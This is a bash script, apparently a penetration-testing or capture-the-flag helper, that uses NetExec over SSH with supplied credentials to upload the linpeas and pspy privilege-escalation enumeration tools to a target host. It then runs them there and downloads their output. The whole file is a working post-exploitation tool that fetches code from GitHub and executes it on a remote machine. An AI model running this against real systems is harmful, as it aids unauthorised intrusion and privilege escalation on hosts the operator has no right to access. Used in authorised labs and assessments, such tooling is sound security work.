#!/bin/bash

# Usage: ./nxc_linux_enum.sh <target> <user> <pass>
# Example: ./nxc_linux_enum.sh 10.10.110.25 house Lucky38

TARGET="$1"
USER="$2"
PASS="$3"

STEPS=8

percent() {
  echo $(( ($1 * 100) / $STEPS ))
}

step() {
  echo "[${1}/${STEPS}] ($(percent $1)%): $2"
}

set -e

# Define latest release URLs
LINPEAS_URL="https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
PSPY_URL="https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64"

step 1 "Downloading latest linpeas.sh"
curl -sSL "$LINPEAS_URL" -o linpeas.sh
chmod +x linpeas.sh

step 2 "Downloading latest pspy64"
curl -sSL "$PSPY_URL" -o pspy64
chmod +x pspy64

step 3 "Uploading linpeas.sh"
nxc ssh "$TARGET" -u "$USER" -p "$PASS" --put-file linpeas.sh /tmp/linpeas.sh > /dev/null 2>&1

step 4 "Running linpeas.sh"
nxc ssh "$TARGET" -u "$USER" -p "$PASS" -x "chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas.out" > /dev/null 2>&1

step 5 "Downloading linpeas output"
nxc ssh "$TARGET" -u "$USER" -p "$PASS" --get-file /tmp/linpeas.out "./${TARGET}_linpeas.out" > /dev/null 2>&1

step 6 "Uploading pspy64"
nxc ssh "$TARGET" -u "$USER" -p "$PASS" --put-file pspy64 /tmp/pspy64 > /dev/null 2>&1

step 7 "Running pspy64 for 60 seconds"
nxc ssh "$TARGET" -u "$USER" -p "$PASS" -x "chmod +x /tmp/pspy64 && timeout 60 /tmp/pspy64 > /tmp/pspy.out" > /dev/null 2>&1

step 8 "Downloading pspy output"
nxc ssh "$TARGET" -u "$USER" -p "$PASS" --get-file /tmp/pspy.out "./${TARGET}_pspy.out" > /dev/null 2>&1

echo "[+] 100% Complete! Results saved as ${TARGET}_linpeas.out and ${TARGET}_pspy.out"
